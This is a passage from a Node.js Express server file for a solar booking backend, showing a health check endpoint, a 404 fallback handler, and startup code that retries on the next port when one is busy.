  res.sendFile(path.join(__dirname, 'bookings.html'));
});

app.get('/health', (req, res) => {
  res.status(200).json({ success: true, status: 'ok' });
});

app.use((req, res) => {
  if (req.originalUrl && req.originalUrl.startsWith('/api/')) {
    return res.status(404).json({
      success: false,
      message: 'API endpoint not found.'
    });
  }

  return res.status(404).send('Page not found');
});

function startServer(port) {
  const server = app.listen(port, () => {
    console.log(`Solar booking backend running on http://localhost:${port}`);
    console.log(`Email notifications: ${isEmailConfigured ? 'enabled' : 'disabled'}`);
    console.log(`WhatsApp notifications: ${isWhatsAppConfigured ? 'enabled' : 'disabled'}`);
  });

  server.on('error', (error) => {
    if (error && error.code === 'EADDRINUSE') {
      const nextPort = port + 1;
      console.warn(`Port ${port} is busy. Retrying on ${nextPort}...`);
      startServer(nextPort);
      return;
    }

    console.error('Server startup error:', error);
    process.exit(1);
  });
}

startServer(PORT);
